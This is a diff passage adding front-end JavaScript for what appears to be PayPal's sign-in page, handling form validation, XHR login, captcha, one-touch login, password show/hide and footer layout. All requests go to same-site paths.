+		 * @param {HTMLElement} captchaDom
+		 * @param {HTMLElement} rememberProfileCb
+		 */
+		function loginWithXhr(formFields, captchaDom, rememberProfileCb) {
+			var captchaValue = captchaDom && captchaDom.field ? captchaDom.field.value : null;
+			var rmProfileChecked = rememberProfileCb ? rememberProfileCb.checked : null;
+			var formData = getPayloadFromFormFields(formFields, captchaValue, rmProfileChecked, isHybrid);
+			return login.utils.makeServerRequestAndReturnPromise('/signin', {
+				data: formData
+			});
+		}
+
+		/**
+		 * Handle response case of loginWithXhr promise
+		 * @param {Object} res
+		 */
+		function handleLoginWithXhrResponse(res) {
+			var keychainInterstitial = document.querySelector('#keychain-interstitial');
+			var activeContent = document.querySelector('#content');
+			var keychainDeviceToken = res && res.keychainDeviceToken;
+			var returnUrl = res && res.returnUrl;
+			btnLogin && btnLogin.removeAttribute('disabled');
+
+			/**
+			 * If keychainDeviceToken is received on response, proceed the Keychain optin
+			 */
+			if (keychainDeviceToken && returnUrl) {
+				login.utils.hideSpinner();
+				login.utils.hideSpinnerMessage();
+				keychainInterstitial && $(keychainInterstitial).removeClass('hide');
+				activeContent && $(activeContent).addClass('hide');
+				login.logger.log({
+					evt: XHR_LOGIN_CAL_TYPE,
+					data: 'XHR_LOGIN_SUCCESS',
+					calEvent: true
+				});
+				login.logger.pushLogs();
+				return login.keychain(res);
+			}
+
+			/**
+			 * Otherwise, redirect to Hermes
+			 */
+			if (returnUrl) {
+				// return to hermes for keychain not-eligible account
+				login.logger.log({
+					evt: XHR_LOGIN_CAL_TYPE,
+					data: 'XHR_LOGIN_SUCCESS',
+					calEvent: true
+				});
+				login.logger.pushLogs();
+				return window.location.href = returnUrl;
+			}
+
+			/**
+			 * Show error messages if notification is present on response
+			 */
+			login.utils.hideSpinner();
+			login.utils.hideSpinnerMessage();
+			if (res.notifications && res.notifications.msg) {
+				var notifications = document.querySelector('.notifications');
+				var notificationsMsg = document.createElement('p');
+				notificationsMsg.innerHTML = res.notifications.msg;
+				notificationsMsg.className += 'notification ' + (res.notifications.type || '');
+				notificationsMsg.setAttribute('role', 'alert');
+				notifications.appendChild(notificationsMsg);
+			}
+			login.logger.log({
+				evt: XHR_LOGIN_CAL_TYPE,
+				data: 'XHR_LOGIN_FAILURE',
+				calEvent: true
+			});
+			return login.logger.pushLogs();
+		}
+
+		/**
+		 * Handle error case of loginWithXhr promise
+		 */
+		function handleLoginWithXhrError() {
+			login.utils.hideSpinner();
+			login.utils.hideSpinnerMessage();
+			btnLogin && btnLogin.removeAttribute('disabled');
+			login.logger.log({
+				evt: XHR_LOGIN_CAL_TYPE,
+				data: 'XHR_FAILED',
+				calEvent: true
+			});
+			login.logger.pushLogs();
+			login.utils.failedXhrSubmitHandler();
+		}
+
+		function isEligibleForLoginXhr() {
+			var intent = login.utils.getIntent();
+			var otCheckboxDOM = document.querySelector('#keepMeLoggedIn');
+			var isCheckboxChecked = otCheckboxDOM && otCheckboxDOM.checked;
+			var keychainXhrSubmit = $('body').data('keychainXhrSubmit') === 'true';
+			var isKeychainExperienceEnabled = $('body').data('isKeychainExperienceEnabled') === 'true';
+			var isKeychainActivationWithEmailTokenOn8ball = document.querySelector('input[name="isKeychainActivationWithEmailTokenOn8ball"]');
+			if (!keychainXhrSubmit || !isKeychainExperienceEnabled || isKeychainActivationWithEmailTokenOn8ball) {
+				return false;
+			}
+			return (intent === 'signin') || (intent === 'checkout' && isCheckboxChecked);
+		}
+
+		/**
+		 * Handle form submit by calling appropriate validator function based on email/password or phone/pin
+		 * @param {Object} event Mouse Click Event
+		 */
+		function onClickSubmitBtnHandler(event) {
+			var isValidInput;
+			var profileRememberedEmail = document.querySelector('.profileRememberedEmail');
+			var isTrackPasswordFieldAutofillEnabled = $('body').data('isTrackPasswordFieldAutofillEnabled');
+			var transitioningDiv = document.querySelector('.transitioning');
+			var formFields = document.querySelectorAll('form[name=login] input') || {};
+			var captchaDom = login.utils.getActiveCaptchaElement(splitLoginContextField);
+			var rememberProfileCb = getActiveRememberProfileElement(splitLoginContextField);
+
+			if (isHybridEditableOnCookied && loginType === 'phone' && emailDom.field) {
+				updatePhoneOnButtonClick(emailDom.field.value);
+			} else {
+				setPhoneAndEmailFieldsFromProfile();
+			}
+			validateOnKeyUp = true;
+
+			// TODO clean this up once non split is killed.
+			function validatePhoneLogin() {
+				// The validation logic on phone can vary to validate phone or pin, based on splitLogin context
+				// or based on email or phone loginType in case of non split pages
+				var splitContext = splitLoginContextField && splitLoginContextField.value;
+				// return early if phoneDom is not present to avoid any unexpected errors upon alidation
+				if (!phoneDom.field) {
+					return;
+				}
+
+				if (isHybridEditableOnCookied) {
+					isValidInput = isValidPhone(emailDom) && passwordDom.field &&
+						validateRequiredFields(phoneDom, passwordDom);
+				} else if (splitContext === 'inputPassword') {
+					// Validation for split password page
+					isValidInput = passwordDom.field && validateRequiredFields(phoneDom, passwordDom);
+				} else {
+					// Validation in case of non split phone pin or split pin (no password supported in non split)
+					isValidInput = pinDom.field && validateRequiredFields(phoneDom, pinDom);
+				}
+			}
+
+			// validate email password on submit
+			if (loginType === 'email') {
+				isValidInput = isValidUserId(emailDom) && validateRequiredFields(emailDom, passwordDom);
+				// Do not apply email format rule from the input password page
+				if (!profileRememberedEmail && isValidInput && $(emailDom.field).hasClass('validate')) {
+					isValidInput = validateEmail(emailDom);
+				}
+			} else {
+				// Validate phone pin / password on submit
+				validatePhoneLogin();
+			}
+
+			if (isTrackPasswordFieldAutofillEnabled) {
+				trackPasswordFieldAutofill();
+			}
+
+			// Proceed to form submit
+			if (isValidInput) {
+				if (isHybridEditableOnCookied) {
+					disablePhoneOrEmailFieldByActiveLoginType();
+				}
+
+				login.utils.showSpinner();
+				login.utils.showSpinnerMessage();
+				login.fn.addFnSyncData();
+				eventPreventDefault(event);
+
+				if (isEligibleForLoginXhr()) {
+					var notifications = document.querySelector('.notifications');
+					if (notifications) {
+						notifications.innerHTML = '';
+					}
+					$(transitioningDiv).addClass('nonTransparentMask');
+					login.utils.showSpinnerMessage('checkingInfo');
+					return loginWithXhr(formFields, captchaDom, rememberProfileCb)
+						.then(handleLoginWithXhrResponse)
+						.catch(handleLoginWithXhrError);
+				}
+
+				// Submit the form to the server manually by calling form.submit().
+				// The submit event is not generated. It is assumed that if the programmer
+				// calls form.submit(), then the script already did all related processing.
+				loginForm && loginForm.submit();
+				// Preventing users from submitting the login multiple times for a safe submit
+				setTimeout(function() {
+					btnLogin.setAttribute('disabled', 'disabled');
+				}, 10);
+			} else {
+				eventPreventDefault(event);
+			}
+		}
+
+		/**
+		 * Handle key up events on email, password, phone and pin (only if user had clicked submit)
+		 */
+		function onFieldKeyUpHandler(dom) {
+			var trimmedValue;
+			if (!validateOnKeyUp) {
+				return false;
+			}
+
+			trimmedValue = dom.field.value.replace(EMPTY_PTN, '');
+			if (trimmedValue === '') {
+				showRequiredError(dom);
+				if (dom.type === 'email') {
+					hideInvalidError(dom);
+				}
+				return;
+			} else {
+				hideRequiredError(dom);
+			}
+
+			if (dom.type === 'email' && $(dom.field).hasClass('validate')) {
+				if (trimmedValue.match(EMAIL_PTN)) {
+					hideInvalidError(dom);
+					hideError(dom, true);
+				} else {
+					showError(dom);
+					showInvalidError(dom);
+				}
+			} else {
+				hideError(dom, true);
+			}
+		}
+
+		/**
+		 * Handle blur events on email, password, phone and pin
+		 */
+		function onFieldBlurHandler(dom) {
+			validateOnKeyUp = false;
+			hideError(dom);
+		}
+
+		/**
+		 * Handle on focus events on email, password, phone, pin and captcha
+		 */
+		function onFieldFocusHandler(dom) {
+			if ($(dom.container).hasClass('hasError')) {
+				validateOnKeyUp = true;
+			} else {
+				validateOnKeyUp = false;
+			}
+		}
+
+		/**
+		 * Validate and return the default login type
+		 * @returns {*}
+		 */
+		function getDefaultLoginType() {
+			var hasPhoneValue = phoneDom.field && phoneDom.field.value; // That's used for hybrid login.
+			if (phoneDom.field && $(phoneDom.field).attr('type') !== 'hidden' &&
+				(emailDom.field && emailDom.field.hasAttribute('disabled') ||
+					splitLoginContextField && splitLoginContextField.value === 'inputPhone')) {
+				return phonePinEnabled ? 'phone' : 'phonePassword';
+			} else if ((splitLoginContextField && splitLoginContextField.value === 'inputPin') || hasPhoneValue) {
+				return 'phone';
+			} else {
+				return 'email';
+			}
+		}
+
+		function playCaptchaAudio(event) {
+			var captchaDom = login.utils.getActiveCaptchaElement(splitLoginContextField);
+			var audioTag = captchaDom.audioTag;
+			var audioSupport = !!(audioTag.canPlayType && audioTag.canPlayType('audio/mpeg').replace(/no/, ''));
+
+			if (audioSupport) {
+				eventPreventDefault(event);
+				// Set the focus to captcha field prior to playing the audio.
+				captchaDom.field.focus();
+				audioTag.play();
+			} else {
+				// Open in new tab or page based on browser
+				return true;
+			}
+		}
+
+		function refreshCaptcha(event) {
+			var captchaDom = login.utils.getActiveCaptchaElement(splitLoginContextField);
+			eventPreventDefault(event);
+			eventStopPropagation(event);
+			$.ajax({
+				type: 'POST',
+				url: '/signin/refreshCaptcha',
+				data: {
+					'_csrf': document.querySelector('#token').value
+				},
+				dataType: 'json',
+				success: function(response) {
+					if (response && response.captcha) {
+						captchaDom.image.setAttribute('src', response.captcha.captchaImgUrl);
+						captchaDom.audioTag.setAttribute('src', response.captcha.captchaAudioUrl);
+						captchaDom.playAudioBtn.setAttribute('href', response.captcha.captchaAudioUrl);
+						captchaDom.field.value = '';
+
+						// Set focus on captcha input field only in desktop browser
+						if ($('body').hasClass('desktop')) {
+							captchaDom.field.focus();
+						}
+					}
+				}
+			});
+		}
+
+		/**
+		 * Toggle sc tracking classes on click of Remember Profile checkbox
+		 */
+		function onRememberProfileClickHandler(event) {
+			var checkBox = getEventTarget(event);
+			if (!checkBox) {
+				return;
+			}
+
+			// Toggle the class with a short delay to prevent the tracking call from picking the change
+			// instead of the pre-toggle value
+			setTimeout(function() {
+				if ($(checkBox).hasClass('scTrack:unifiedlogin-rememberme-profile-opt-in')) {
+					$(checkBox).removeClass('scTrack:unifiedlogin-rememberme-profile-opt-in');
+					$(checkBox).addClass('scTrack:unifiedlogin-rememberme-profile-opt-out');
+				} else {
+					$(checkBox).removeClass('scTrack:unifiedlogin-rememberme-profile-opt-out');
+					$(checkBox).addClass('scTrack:unifiedlogin-rememberme-profile-opt-in');
+				}
+			}, 10);
+		}
+
+		// Attach events for email and password fields
+		if (emailDom.field) {
+			emailDom.field.onkeyup = onFieldKeyUpHandler.bind(null, emailDom);
+			emailDom.field.onblur = onFieldBlurHandler.bind(null, emailDom);
+			emailDom.field.onfocus = onFieldFocusHandler.bind(null, emailDom);
+		}
+
+		if (passwordDom.field) {
+			passwordDom.field.onkeyup = onFieldKeyUpHandler.bind(null, passwordDom);
+			passwordDom.field.onblur = onFieldBlurHandler.bind(null, passwordDom);
+			passwordDom.field.onfocus = onFieldFocusHandler.bind(null, passwordDom);
+		}
+
+		// Attach events for phone and pin fields (only if they exist)
+		if (phoneDom.field) {
+			phoneDom.field.onkeyup = onFieldKeyUpHandler.bind(null, phoneDom);
+			phoneDom.field.onblur = onFieldBlurHandler.bind(null, phoneDom);
+			phoneDom.field.onfocus = onFieldFocusHandler.bind(null, phoneDom);
+		}
+		if (pinDom.field) {
+			pinDom.field.onkeyup = onFieldKeyUpHandler.bind(null, pinDom);
+			pinDom.field.onblur = onFieldBlurHandler.bind(null, pinDom);
+			pinDom.field.onfocus = onFieldFocusHandler.bind(null, pinDom);
+		}
+
+		if (phoneCodeDom && phoneCodeDom.field) {
+			phoneCodeDom.field.onchange = onPhoneCodeChangeEventHandler;
+			if (isHybrid) {
+				phoneCodeDom.field.onclick = onPhoneCodeClickEventHandler;
+			}
+		}
+
+		// Loop over all captcha elements to bind events to
+		// TODO: Improve this code by using Event Delegation instead OR avoid multiple similar DOM elements
+		function bindCaptchaEventHandlers() {
+			var wrappers = document.querySelectorAll('.captcha-container');
+			for (var i = 0; i < wrappers.length; i++) {
+				bindHandlers(login.utils.getCaptchaDom(wrappers[i]));
+			}
+
+			function bindHandlers(captchaDom) {
+				captchaDom.playAudioBtn.onclick = playCaptchaAudio;
+				captchaDom.refreshCaptchaBtn.onclick = refreshCaptcha;
+				captchaDom.field.onkeyup = onFieldKeyUpHandler.bind(null, captchaDom);
+				captchaDom.field.onblur = onFieldBlurHandler.bind(null, captchaDom);
+				captchaDom.field.onfocus = onFieldFocusHandler.bind(null, captchaDom);
+			}
+		}
+		bindCaptchaEventHandlers();
+
+		// Hide education message on close button click
+		function removeEducationInfo(event) {
+			var target = getEventTarget(event);
+			var educationMessage, contentContainer, removeMsgInput;
+
+			// Return early if this function does not apply to the clicked element
+			if (!target || target.id !== 'iconCloseEducation') {
+				return;
+			}
+
+			educationMessage = document.querySelector('.educationMessage');
+			if (!educationMessage) {
+				return;
+			}
+
+			contentContainer = document.querySelector('.contentContainer');
+
+			$(educationMessage).addClass('hide');
+			if (contentContainer) {
+				$(contentContainer).removeClass('contentContainerShort');
+			}
+
+			// Add hidden input, so server side can decide to stop showing the education message
+			removeMsgInput = document.createElement('input');
+			removeMsgInput.setAttribute('type', 'hidden');
+			removeMsgInput.setAttribute('name', 'removeEducationMsg');
+			removeMsgInput.setAttribute('value', 'true');
+			$(loginForm).append(removeMsgInput);
+		}
+
+		// Attach events for toggling between email/password and phone/pin (only if applicable)
+		if (emailIcon && phoneIcon) {
+			emailIcon.onclick = enableEmailPassword;
+			phoneIcon.onclick = enablePhonePin;
+		} else if (emailIcon) {
+			// In case of mobile ID login we would only have emailIcon and not phoneIcon
+			// and we have a different event listener
+			emailIcon.onclick = switchToSplitEmailFromPasswordPage;
+		}
+
+		// Attach events to switch the split screen between email and phone
+		if (phonePasswordEnabled && switchToPhoneLink) {
+			switchToPhoneLink.onclick = switchToPhoneLogin;
+		}
+		if (phonePasswordEnabled && switchToEmailLink) {
+			switchToEmailLink.onclick = switchToEmailLogin;
+		}
+
+		addEvent(countryPhoneSelectWrapper, 'focusin', function(event) {
+			$(countryPhoneSelectWrapper).addClass('focus');
+		});
+		addEvent(countryPhoneSelectWrapper, 'focusout', function(event) {
+			$(countryPhoneSelectWrapper).removeClass('focus');
+		});
+		if (emailPageSwitch) {
+			addEvent(emailPageSwitch, 'click', function(event) {
+				var forcePhonePasswordOptIn = document.querySelector('input[name=forcePhonePasswordOptIn]');
+				eventPreventDefault(event);
+				switchToSplitEmailFromPasswordPage(event, function() {
+					forcePhonePasswordOptIn.value = 'true';
+				});
+			});
+		}
+
+		// Attach event for the button that submits the login
+		addEvent(loginForm, 'keydown', function(event) {
+			// Check to see if the enter key was pressed
+			// Submit the form if the intention was to not switch to phone
+			var target = getEventTarget(event);
+			if (isEnterKeyPressed(event) && (!target.href) && !$(target).hasClass('show-hide-password')) {
+				onFormSubmitHandler(event);
+			}
+		});
+		addEvent(loginForm, 'submit', onFormSubmitHandler);
+
+		// click on "Approve login using mobile device"
+		if (moreOptionsMobileLink) {
+			addEvent(moreOptionsMobileLink, 'click', clickTpdHandler);
+		}
+		if (tpdButton) {
+			addEvent(tpdButton, 'click', clickTpdHandler);
+		}
+		if (backToInputEmailLink) {
+			addEvent(backToInputEmailLink, 'click', function(event) {
+				backToInputEmailClickHandler(event);
+				if (isHybrid) {
+					resetForm();
+				}
+			});
+		}
+
+		if (backToEmailPasswordLink) {
+			addEvent(backToEmailPasswordLink, 'click', function(event) {
+				event.preventDefault();
+				if (splitLoginCookiedFallback) {
+					enableEmailPassword();
+				} else {
+					backToInputEmailClickHandler(event);
+				}
+			});
+		}
+
+		function clickTpdHandler(event) {
+			var isValidInput = loginType === 'email' ? isValidUserId(emailDom) : isValidPhone(phoneDom);
+			var tpdEventTarget = getEventTarget(event);
+			eventPreventDefault(event);
+			login.tpdLogin && login.tpdLogin.instrumentTpdLoginClicked(tpdEventTarget.id);
+			// TPD survey bubble only appears when PN is auto-send
+			// For TPDAutosend user who click More Options->Tpd, we set TPDSurveyEnabled to false
+			// To stop showing the survey bubble when they click usePWInstead
+			document.body.setAttribute('data-tpd-survey-enabled', false);
+			if (isValidInput && $(emailDom.field).hasClass('validate')) {
+				isValidInput = validateEmail(emailDom);
+			}
+			if (!isValidInput) {
+				return;
+			}
+
+			login.tpdLogin && login.tpdLogin.attemptTpdLogin(tpdEventTarget.id);
+		}
+
+		function backToInputEmailClickHandler(event) {
+			updatePwrForRecoveryUsingEmail();
+			loginType = 'email';
+			login.utils.notYouClickHandler(event);
+			// Hide the dom errors if any
+			emailDom.container && hideError(emailDom, true);
+			passwordDom.container && hideError(passwordDom, true);
+			phoneDom.container && hideError(phoneDom, true);
+			pinDom.container && hideError(pinDom, true);
+		}
+		if (rememberProfileCheckBox) {
+			rememberProfileCheckBox.onclick = onRememberProfileClickHandler;
+		}
+
+		// Subscribe methods to top level click
+		if (login.pubsub) {
+			login.pubsub.subscribe('WINDOW_CLICK', removeEducationInfo);
+		}
+	}
+}());
+
+// One Touch login utils
+login.oneTouchLogin = (function() {
+	var utils = login.utils;
+	var loadResources = login.loadResources;
+	var logger = login.logger;
+	var ulData = window.PAYPAL.ulData || {};
+	var calEventType = 'ONETOUCH_LOGIN';
+	var intent = utils.getIntent();
+
+	function logClientSideData() {
+		var clientLogList = [];
+		var currentLang = document.querySelector('input[name="locale.x"]');
+
+		clientLogList.push({evt: 'state_name', data: 'Login_UL_RM', instrument: true});
+		clientLogList.push({evt: 'transition_name', data: 'prepare_login_UL_RM', instrument: true});
+		clientLogList.push({evt: 'design',
+			data: utils.isInContextIntegration() ? 'in-context' : 'full-context', instrument: true});
+		if (currentLang) {
+			clientLogList.push({evt: 'page_lang', data: currentLang.value, instrument: true});
+		}
+		clientLogList.push({evt: calEventType, data: 'PREPARE_PAGE_' + intent.toUpperCase(), calEvent: true});
+		logger.clientLog(clientLogList, null);
+	}
+
+	function updatePageLevelError(msg, msgTyp) {
+		var notificationContainer = document.querySelector('.notifications');
+		var paraEle, notificationMsg;
+
+		if (notificationContainer) {
+			paraEle = document.createElement('p');
+			notificationMsg = document.createTextNode(msg);
+
+			paraEle.setAttribute('class', 'notification ' + msgTyp);
+			paraEle.setAttribute('role', 'alert');
+
+			paraEle.appendChild(notificationMsg);
+			notificationContainer.appendChild(paraEle);
+		}
+	}
+
+	// Private method to attempt one touch login and handle the flow navigation
+	function doOneTouchLogin() {
+		// Get all of the hidden login form input element (except any of public credential field)
+		var loginFormInputList = document.querySelectorAll('form[name=login] input[type=hidden]');
+		var loginEmail = document.querySelector('input[name=login_email]');
+		var loginPassword = document.querySelector('input[name=login_password]');
+		var oneTouchUser = $('body').data('oneTouchUser');
+		var oneTouchTenant = $('body').data('oneTouchTenant');
+		var intent = login.utils.getIntent();
+		var cookieBannerEnabled = $('body').data('cookieBannerEnabled');
+		var isKeychainOptinRequired = $('body').data('isKeychainOptinRequired');
+
+		// List of form fields expected to send over JWT based login form
+		var otFormInputs = {_csrf: 1, intent: 1, flowId: 1, ctxId: 1, returnUri: 1, state: 1, 'locale.x': 1};
+		var data = {};
+
+		// Iterate all the hidden form input field list
+		for (var i = 0; i < loginFormInputList.length; i++) {
+			if (otFormInputs[loginFormInputList[i].name]) {
+				data[loginFormInputList[i].name] = loginFormInputList[i].value;
+			}
+		}
+
+		// If missing of either one required parameter is not intent for one touch login
+		if (!data.intent || (intent !== 'prox' && !data.returnUri) || !oneTouchUser) {
+			utils.hideSpinner();
+			autoLoginfallBackClientLog(); // Trigger the default client side log
+			return;
+		}
+
+		// Pass the actual intent as otLoginIntent as well for scalability
+		data['otLoginIntent'] = data.intent;
+		data['login_email'] = loginEmail && loginEmail.value;
+
+		if (oneTouchTenant) {
+			data['oneTouchTenant'] = oneTouchTenant;
+		}
+
+		// Start to show the progress message with spinner
+		utils.showSpinner();
+		// Log FPTI
+		logClientSideData();
+
+		$.ajax({
+			url: '/signin/ot-token',
+			method: 'POST',
+			data: data,
+			success: function(res) {
+				var notifications;
+
+				if (loginEmail) {
+					loginEmail.removeAttribute('disabled');
+				}
+
+				if (loginPassword) {
+					loginPassword.removeAttribute('disabled');
+				}
+
+				// keychainDeviceToken drops only if eligible for keychain optin
+				if (res.keychainDeviceToken && login.keychain) {
+					return login.keychain(res);
+				}
+
+				if (res.smartlockOptIn && login.smartLock) {
+					login.smartLock(res);
+					return;
+				}
+				if (res.incompleteContext) {
+					window.location.href = window.location.href;
+					return;
+				}
+				// Do redirect to returnUrl on success
+				if (res.returnUrl) {
+					window.location.href = res.returnUrl;
+					return;
+				}
+				notifications = res.notifications;
+				if (notifications) {
+					updatePageLevelError(notifications.msg, notifications.type);
+				}
+				// In case if there is not returnUrl then show login page
+				// It is not expected to happen in any case
+				utils.hideSpinner();
+				utils.hideSpinnerMessage('secureMessage');
+				utils.hideSpinnerMessage('oneTouchMessage');
+				autoLoginfallBackClientLog({error_code: 'ot_login_failed'});
+				if (cookieBannerEnabled) {
+					loadResources && loadResources.showCookieBanner();
+				}
+			},
+			fail: function(status) {
+				// Show login page
+				utils.hideSpinner();
+				if (loginEmail) {
+					loginEmail.removeAttribute('disabled');
+				}
+
+				if (loginPassword) {
+					loginPassword.removeAttribute('disabled');
+				}
+				utils.hideSpinnerMessage('secureMessage');
+				utils.hideSpinnerMessage('oneTouchMessage');
+				autoLoginfallBackClientLog({error_code: 'ot_login_xhr_fail'});
+				if (cookieBannerEnabled) {
+					loadResources && loadResources.showCookieBanner();
+				}
+			}
+		});
+	}
+
+	return function oneTouchLogin() {
+		var oneTouchUser = $('body').data('oneTouchUser');
+		var isKeychainOptinRequired = $('body').data('isKeychainOptinRequired') === 'true';
+		var tpdAutoSend = $('body').data('tpdAutoSend');
+		var aPayAuth = ulData.aPayAuth;
+
+		// This is the short term approach to avoid triggering both A-Pay and One Touch login when both eligible
+		if (!aPayAuth && oneTouchUser) {
+			doOneTouchLogin();
+			return;
+		}
+
+		if (aPayAuth && ulData.canNotMakePayment) {
+			doOneTouchLogin();
+			return;
+		}
+
+		// In case of no OT or APay feature supported then hide any default spinner
+		if (!tpdAutoSend && !oneTouchUser && !isKeychainOptinRequired) {
+			utils.hideSpinner();
+		}
+	}
+}());
+
+// SHOW HIDE PASSWORD
+login.showHidePassword = (function() {
+	function initShowHide(el, baseType) {
+		var btnShow = el.querySelector('.showPassword');
+		var btnHide = el.querySelector('.hidePassword');
+		var field = el.querySelector('.pin-password');
+		var pwFpIcon = el.querySelector('#pwFpIcon');
+
+		function undisplayShowHideButtons () {
+			$(btnShow).addClass('hide');
+			$(btnHide).addClass('hide');
+		}
+
+		baseType = baseType || 'text';
+
+		// In case of webkit browsers, base type as well as input field type will be 'tel'
+		// In UL the pin is masked using a webkit specific property via special class
+		// Instead of toggling between 'type' of input field, we toggle this class
+		if (baseType === 'tel') {
+			$(field).addClass('tel-password');
+		}
+
+		function showPassword(e) {
+			if (baseType === 'tel') {
+				$(field).removeClass('tel-password');
+			} else {
+				field.setAttribute('type', baseType);
+			}
+			$(btnShow).addClass('hide');
+			$(btnHide).removeClass('hide');
+			field.focus();
+
+			e.stopPropagation();
+
+			login.logger.log({
+				evt: 'is_pwd_sh',
+				data: 'Y',
+				instrument: true
+			});
+			login.logger.pushLogs();
+		}
+
+		function hidePassword(e) {
+			if (baseType === 'tel') {
+				$(field).addClass('tel-password');
+			} else {
+				field.setAttribute('type', 'password');
+			}
+			$(btnShow).removeClass('hide');
+			$(btnHide).addClass('hide');
+			field.focus();
+			e.stopPropagation();
+
+			login.logger.log({
+				evt: 'is_pwd_sh',
+				data: 'N',
+				instrument: true
+			});
+			login.logger.pushLogs();
+		}
+
+		function displayShowHideButtons(e) {
+			undisplayShowHideButtons();
+			if ((login.utils.isFieldPrefilled(field) || field.value.length > 0) && pwFpIcon && $(pwFpIcon).hasClass('hide')) {
+				if (baseType === 'text') {
+					// email/password
+					if (field.getAttribute('type') === 'password') {
+						$(btnShow).removeClass('hide');
+					} else {
+						$(btnHide).removeClass('hide');
+					}
+				} else {
+					// phone/pin
+					if ($(field).hasClass('tel-password')) {
+						$(btnShow).removeClass('hide');
+					} else {
+						$(btnHide).removeClass('hide');
+					}
+				}
+			}
+			e.stopPropagation();
+		}
+
+		// Show the password (change input field type to text) on click of Show
+		btnShow.onclick = showPassword;
+
+		// Mask the password (change input field type to password - or add class to mask tel) on click of Hide
+		btnHide.onclick = hidePassword;
+
+		// On focus OR keyup of the password/pin field, display Show button if password/pin field has a value
+		field.onfocus = displayShowHideButtons
+
+		addEvent(field, 'keyup', displayShowHideButtons)
+
+		// Prevent hiding the `Show` button in case password/pin field was clicked
+		field.onclick = function(e) {
+			e.stopPropagation();
+		};
+
+		// Hide the show/hide buttons in case user clicks anywhere
+		// The field's onclick event handler will stop propagation to prevent hiding on click of field
+		window.onclick = undisplayShowHideButtons;
+	}
+
+	return function showHidePassword() {
+		var signUpSection = document.querySelector('#signUpSection');
+		var passwordSection = document.querySelector('#passwordSection');
+		var pinSection = document.querySelector('#pinSection') || document.querySelector('#splitPinSection');
+		var pinField;
+		if (pinSection) {
+			pinField = pinSection.querySelector('.pin-password');
+		}
+
+		if (signUpSection) {
+			initShowHide(signUpSection);
+		}
+
+		if (passwordSection) {
+			initShowHide(passwordSection);
+		}
+
+		// The `type` attribute of the PIN input field will be set to 'tel' only for webkit browsers
+		// In case it's not webkit (e.g. IE on Windows Phone) the PIN field
+		// will have type=password. In this case we need to set 'base' type to 'text'
+		// Base type is the type to use in case user clicks 'show password' in non-webkit browser
+		if (pinSection && pinField) {
+			initShowHide(pinSection, pinField.getAttribute('type') === 'tel' ? 'tel' : 'text');
+		}
+	}
+}());
+
+// ONE TOUCH
+login.oneTouch = (function() {
+	return function oneTouch() {
+		var kmliBtn = document.querySelector('.keepMeLoginAbout');
+		var kmliContent = document.getElementById('keepMeLoginTerms');
+		var tagLine = document.querySelector('.keepMeLogin .tagLine');
+		var kmliCb = login.utils.getKmliCb();
+		var scTrackKmliOpen = 'scTrack:unifiedlogin-rememberme-about-open';
+		var scTrackKmliClose = 'scTrack:unifiedlogin-rememberme-about-close';
+		var scTrackKmliOptIn = 'scTrack:unifiedlogin-rememberme-opt-in';
+		var scTrackKmliOptOut = 'scTrack:unifiedlogin-rememberme-opt-out';
+
+		if (!kmliCb || !kmliBtn || !kmliContent) {
+			return;
+		}
+
+		// Remove target specific href to prevent from page scrolling to content
+		kmliBtn.setAttribute('href', '#');
+
+		// Slide up/down KMLI content & toggle sc tracking classes on click of KMLI info button
+		kmliBtn.onclick = function() {
+			if ($(kmliContent).hasClass('slideUp')) {
+				// slideUp/slideDown defines the 'state' of the content box (up means closed, down means open)
+				$(kmliContent).removeClass('slideUp');
+				$(kmliContent).addClass('slideDown');
+				$(kmliBtn).attr('aria-expanded', 'true');
+				// SC tracking open/close implies call to action
+				// Toggle the class with a short delay to prevent the tracking call from picking the change
+				// instead of the pre-toggle value
+				setTimeout(function() {
+					$(kmliBtn).removeClass(scTrackKmliOpen);
+					$(kmliBtn).addClass(scTrackKmliClose);
+				}, 10);
+			} else {
+				// slideUp/slideDown defines the 'state' of the content box (up means closed, down means open)
+				$(kmliContent).removeClass('slideDown');
+				$(kmliContent).addClass('slideUp');
+				$(kmliBtn).attr('aria-expanded', 'false');
+				// SC tracking open/close implies call to action
+				// Toggle the class with a short delay to prevent the tracking call from picking the change
+				// instead of the pre-toggle value
+				setTimeout(function() {
+					$(kmliBtn).removeClass(scTrackKmliClose);
+					$(kmliBtn).addClass(scTrackKmliOpen);
+				}, 10);
+			}
+
+			// User should be able to open/close KMLI content on hitting Enter repeatedly
+			kmliBtn.focus();
+
+			// Show hide the tagline on slide up/down event
+			if (tagLine) {
+				$(tagLine).toggle();
+			}
+
+			// Trigger a window resize to displace the footer on open/close KMLI content
+			setTimeout(function() {
+				window.dispatchEvent && window.dispatchEvent(createNewEvent('resize'));
+			}, 200);
+		};
+
+		// Toggle sc tracking classes on click of One Touch checkbox
+		kmliCb.onclick = function() {
+			// Toggle the class with a short delay to prevent the tracking call from picking the change
+			// instead of the pre-toggle value
+			setTimeout(function() {
+				if ($(kmliCb).hasClass(scTrackKmliOptIn)) {
+					$(kmliCb).removeClass(scTrackKmliOptIn);
+					$(kmliCb).addClass(scTrackKmliOptOut);
+				} else {
+					$(kmliCb).removeClass(scTrackKmliOptOut);
+					$(kmliCb).addClass(scTrackKmliOptIn);
+				}
+			}, 10);
+		}
+	}
+}());
+
+// Footer
+login.footer = (function() {
+	var localeSelectors = document.querySelectorAll('.localeSelector li a');
+
+	// Instrument each locale link, if clicked
+	for (var i = 0; i < localeSelectors.length; i++) {
+		localeSelectors[i].onclick = login.utils.getOutboundLinksHandler(localeSelectors[i], null, 'process_language_change');
+	}
+
+	function displaceFooter() {
+		var footer = document.querySelector('.footer');
+		var content = document.querySelector('.activeContent');
+		var returnToMerchant = document.querySelector('#returnToMerchant');
+		var totalContentHeight, windowHeight;
+		var returnToMerchantHeight = returnToMerchant && $(returnToMerchant).outerHeight() || 0;
+		totalContentHeight = $(content).outerHeight() + $(footer).outerHeight() + returnToMerchantHeight;
+		// Calculate window height for web browsers and apps that load us in webviews & view controllers
+		windowHeight = window.innerHeight ||
+			(document.documentElement && document.documentElement.clientHeight) ||
+			// screen is available directly but double checking for webviews
+			(window.screen && window.screen.height) ||
+			document.height || (document.body && document.body.offsetHeight);
+
+		if (windowHeight < totalContentHeight) {
+			$(footer).addClass('footerStayPut');
+		} else {
+			$(footer).removeClass('footerStayPut');
+		}
+	}
+
+	return function footer() {
+		displaceFooter();
+		addEvent(window, 'resize', displaceFooter);
+	}
+}());
+
+var model = {
+   "viewName":"contextualLoginView/checkout",
+   "production":true,
+   "isInlineUl":false,
+   "validateEmailFormat":true,
+   "isInjectedUl":false,
+   "inlineUlSuffix":"",
